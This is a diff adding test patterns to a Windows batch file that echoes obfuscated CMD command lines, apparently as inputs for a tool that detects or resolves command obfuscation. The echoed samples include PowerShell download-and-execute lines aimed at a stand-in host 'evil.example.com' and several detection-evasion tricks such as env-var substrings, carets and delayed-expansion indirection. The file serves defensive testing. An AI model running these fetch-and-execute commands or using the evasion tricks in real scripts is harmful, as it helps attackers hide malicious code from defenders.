@@ -52,6 +52,36 @@ echo [TEST] FOR loop obfuscation:
 set "payload=powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://evil.example.com/script.ps1')"
 echo %payload%
 
+REM ── Technique 7: Inline single-token env-var substring ──
+REM A single %VAR:~start,length% inside a sensitive keyword like
+REM Powe…Shell.exe — this defeats finders that require ≥2 substrings.
+echo [TEST] Inline single-token substring:
+echo cmd.exe /c "Powe%ALLUSERSPROFILE:~4,1%Shell.exe IEX (New-Object Net.WebClient).DownloadString('http://example.com/x')"
+
+REM ── Technique 8: FOR /F set^|findstr trick ──
+REM Pull the value of an env var by name match without naming it directly.
+echo [TEST] FOR /F set^|findstr:
+echo FOR /F "delims=s\ tokens=4" %%a IN ('set^^^|findstr PSM') DO %%a
+
+REM ── Technique 9: %COMSPEC% in argv0 position ──
+REM Bare %COMSPEC% replaces "cmd.exe" entirely; resolver must recognise
+REM that the first token of the line is itself an env-var reference.
+echo [TEST] COMSPEC argv0:
+echo %%COMSPEC%% /b /c start /b /min netstat -ano ^| findstr LISTENING
+
+REM ── Technique 10: Same-line set + call ──
+REM `set com=…&&call %com%` — variable defined and consumed in one line.
+echo [TEST] Same-line set+call:
+echo cmd /c "set com=netstat /ano&&call %%com%%"
+
+REM ── Technique 11: Carets inside %VAR% + indirect-name set + delayed-expansion ──
+REM The big wmic-style blob. Combines:
+REM   * carets inside %Co^m^S^p^Ec^% (cmd strips them before expansion)
+REM   * indirect-name set: `set %X%=val` defines variable named *value of X*
+REM   * delayed-expansion indirection: !%X%! reads the var named by %X%
+echo [TEST] wmic-style multi-trick blob:
+echo %%Co^^m^^S^^p^^Ec^^%% /v:on /c "set X=A&& set Y=B&& set Z=C&& set %%X%%=net&& set %%Y%%=stat&& set %%Z%%=-ano&& !%%X%%!!%%Y%%! !%%Z%%!"
+
 echo.
 echo [DONE] All CMD obfuscation test patterns rendered.
 pause
